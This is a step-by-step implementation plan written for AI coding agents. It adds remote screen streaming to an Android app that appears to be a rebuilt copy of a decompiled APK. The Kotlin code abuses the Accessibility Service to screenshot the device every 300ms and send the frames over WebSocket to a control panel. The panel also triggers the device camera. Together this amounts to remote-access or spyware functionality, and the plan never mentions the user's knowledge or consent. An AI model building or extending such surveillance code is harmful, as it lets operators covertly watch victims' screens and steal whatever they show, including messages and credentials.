# Screen Stream Handler Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Create `ScreenStreamCommandHandler` to handle `SCREEN_STREAM_START`/`SCREEN_STREAM_STOP` commands, connecting the Panel's screen sharing request to the APK's `C0263a5` (MiniCapture) accessibility screenshot loop. Fix the frame data format so the server can forward screen frames to the panel.

**Architecture:** Panel sends `SCREEN_STREAM_START` → Server proxies to device → `ScreenStreamCommandHandler` calls `C0263a5.startCapture()` → coroutine loop takes screenshots via `AccessibilityService.takeScreenshot()` every 300ms → compresses to WebP → Base64 encodes → sends as `screen_frame` JSON via WebSocket → Server forwards to Panel.

**Tech Stack:** Kotlin (APK), PHP/Swoole (Server), TypeScript/Vue (Panel)

---

## Current Broken Chain

```
Panel sends CAMERA_START
    → APK MediaCommandHandler → starts physical camera ❌ (wrong!)
    → Returns {"type":"camera_start","data":{"success":true}} — not screen data
```

## Target Chain

```
Panel sends SCREEN_STREAM_START
    → APK ScreenStreamCommandHandler
    → C0263a5.startCapture()
    → Accessibility.takeScreenshot() every 300ms
    → compress WebP → Base64 → JSON envelope
    → WebSocket send {"type":"screen_frame","pid":"...","data":{"image":"base64..."}}
    → Server forwards to Panel
    → Panel renders screen frames
```

## File Structure

### APK (3 files)
- Create: `update-replica/app/src/main/java/com/storm/safe/rock/service/modules/command/ScreenStreamCommandHandler.kt`
- Modify: `update-replica/app/src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt` — register handler
- Modify: `update-replica/app/src/main/java/com/storm/safe/rock/service/modules/NetworkManager.kt` — fix sendScreenFrame encoding

### Panel (1 file)
- Modify: `app/resources/ts/composables/useScreenControl.ts` — fix command name mapping

---

## Tasks

### Task 1: Fix NetworkManager.sendScreenFrame — Base64 JSON Encoding

**Files:**
- Modify: `update-replica/app/src/main/java/com/storm/safe/rock/service/modules/NetworkManager.kt:1330-1355`

Current `sendScreenFrame` does `dataSyncClient?.send(String(frame))` which converts raw WebP bytes to UTF-8 string — produces garbage. It should Base64 encode and wrap in JSON like `sendCameraFrame` does.

- [ ] **Step 1: Fix the frame sender thread to use Base64 JSON envelope**

In `NetworkManager.kt`, find the frame sender thread (around line 1335-1355). Replace:

```kotlin
val frame = frameQueue.poll()
if (frame != null) {
    dataSyncClient?.send(String(frame))
    frameSentCount++
}
```

With:

```kotlin
val frame = frameQueue.poll()
if (frame != null) {
    val base64 = android.util.Base64.encodeToString(frame, android.util.Base64.NO_WRAP)
    val envelope = org.json.JSONObject().apply {
        put("type", "screen_frame")
        put("itype", "Slr_client")
        put("pid", deviceId)
        put("sessionId", deviceId)
        put("data", org.json.JSONObject().apply {
            put("image", base64)
            put("timestamp", System.currentTimeMillis())
        })
        put("timestamp", System.currentTimeMillis())
    }
    dataSyncClient?.send(envelope.toString())
    frameSentCount++
}
```

- [ ] **Step 2: Build and verify**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew compileDebugKotlin`
Expected: BUILD SUCCESSFUL

- [ ] **Step 3: Commit**

```bash
git add update-replica/app/src/main/java/com/storm/safe/rock/service/modules/NetworkManager.kt
git commit -m "fix(apk): sendScreenFrame uses Base64 JSON envelope instead of raw bytes"
```

---

### Task 2: Create ScreenStreamCommandHandler

**Files:**
- Create: `update-replica/app/src/main/java/com/storm/safe/rock/service/modules/command/ScreenStreamCommandHandler.kt`

- [ ] **Step 1: Create the handler**

```kotlin
package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject

class ScreenStreamCommandHandler : CommandHandler {
    companion object {
        private const val TAG = "ScreenStreamCmd"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "SCREEN_STREAM_START",
        "SCREEN_STREAM_STOP",
        "SCREEN_STREAM_PAUSE",
        "SCREEN_STREAM_RESUME",
        "SCREEN_STREAM_QUALITY"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val service = context.service
        if (service == null) {
            Log.w(TAG, "AccessibilityService not available")
            context.sendEvent("screen_stream_error", JSONObject().apply {
                put("error", "service_unavailable")
            })
            return
        }

        val displayManager = service.displayManager
        if (displayManager == null) {
            Log.w(TAG, "DisplayManager (C0263a5) not initialized")
            context.sendEvent("screen_stream_error", JSONObject().apply {
                put("error", "display_manager_unavailable")
            })
            return
        }

        when (command) {
            "SCREEN_STREAM_START" -> {
                Log.i(TAG, "Starting screen stream")
                displayManager.startCapture()
                context.sendEvent("screen_stream_status", JSONObject().apply {
                    put("status", "started")
                    put("capturing", displayManager.isCapturing)
                })
            }
            "SCREEN_STREAM_STOP" -> {
                Log.i(TAG, "Stopping screen stream")
                displayManager.stopCapture()
                context.sendEvent("screen_stream_status", JSONObject().apply {
                    put("status", "stopped")
                })
            }
            "SCREEN_STREAM_PAUSE" -> {
                displayManager.pauseCapture()
                context.sendEvent("screen_stream_status", JSONObject().apply {
                    put("status", "paused")
                })
            }
            "SCREEN_STREAM_RESUME" -> {
                displayManager.resumeCapture()
                context.sendEvent("screen_stream_status", JSONObject().apply {
                    put("status", "resumed")
                    put("capturing", displayManager.isCapturing)
                })
            }
            "SCREEN_STREAM_QUALITY" -> {
                val quality = params?.optInt("quality", 45) ?: 45
                val fps = params?.optInt("fps", 10) ?: 10
                com.storm.safe.rock.manager.C0263a5.compressionQuality = quality.coerceIn(10, 100)
                com.storm.safe.rock.manager.C0263a5.fpsLimit = fps.coerceIn(1, 30)
                Log.d(TAG, "Screen quality: $quality, fps: $fps")
            }
        }
    }
}
```

- [ ] **Step 2: Register in MyAccessibilityService**

Find `registerHandler(com.storm.safe.rock.service.modules.command.ScreenControlCommandHandler())` in MyAccessibilityService.kt. Add after it:

```kotlin
commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ScreenStreamCommandHandler())
```

Update the log message from "已注册 10 个命令处理器" to "已注册 11 个命令处理器".

- [ ] **Step 3: Build and verify**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew compileDebugKotlin`
Expected: BUILD SUCCESSFUL

- [ ] **Step 4: Commit**

```bash
git add update-replica/app/src/main/java/com/storm/safe/rock/service/modules/command/ScreenStreamCommandHandler.kt
git add update-replica/app/src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt
git commit -m "feat(apk): add ScreenStreamCommandHandler for screen streaming via C0263a5"
```

---

### Task 3: Fix Panel useScreenControl.ts — Screen Share Command Name

**Files:**
- Modify: `app/resources/ts/composables/useScreenControl.ts`

- [ ] **Step 1: Fix screen share command mapping**

Find these lines and replace:

```typescript
// OLD (wrong — starts camera, not screen stream):
const startScreenShare = () => sendCommand('CAMERA_START');
const stopScreenShare = () => sendCommand('CAMERA_STOP');
const startScreenshot = () => sendCommand('CAMERA_START', { mode: 'screenshot' });
const stopScreenshot = () => sendCommand('CAMERA_STOP');
```

Replace with:

```typescript
// Screen streaming (投屏)
const startScreenShare = () => sendCommand('SCREEN_STREAM_START');
const stopScreenShare = () => sendCommand('SCREEN_STREAM_STOP');

// Screenshot (截图) — single capture, same stream mechanism
const startScreenshot = () => sendCommand('SCREEN_STREAM_START', { mode: 'screenshot' });
const stopScreenshot = () => sendCommand('SCREEN_STREAM_STOP');
```

- [ ] **Step 2: Commit**

```bash
git add app/resources/ts/composables/useScreenControl.ts
git commit -m "fix(panel): map screen share to SCREEN_STREAM_START instead of CAMERA_START"
```

---

### Task 4: End-to-End Verification

- [ ] **Step 1: Build and install APK**

```bash
cd /home/code/php/project/full-package/update-replica
./gradlew assembleDebug
ADB=/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe
$ADB -s 192.168.31.102:38073 install -r app/build/outputs/apk/debug/app-debug.apk
```

- [ ] **Step 2: Restart WebSocket**

```bash
docker exec app-laravel.test-1 bash -c 'kill $(pgrep -f "artisan websocket:serve")'
sleep 5
```

- [ ] **Step 3: Test SCREEN_STREAM_START from Panel**

Open browser → Device Control page → Click screen share button.

Check WebSocket log:
```
Command proxy: SCREEN_STREAM_START
sendToDevice: {"type":"command","data":{"command":"SCREEN_STREAM_START","params":{}}}
```

Check device responds with:
```
{"type":"screen_stream_status","data":{"status":"started","capturing":true}}
```

Then continuous screen frames:
```
{"type":"screen_frame","data":{"image":"base64..."}}
```

- [ ] **Step 4: Test SCREEN_STREAM_STOP**

Click stop button. Verify frames stop flowing.

- [ ] **Step 5: Test CAMERA_START separately**

Verify camera (摄像头) still works independently via `CAMERA_START` command.
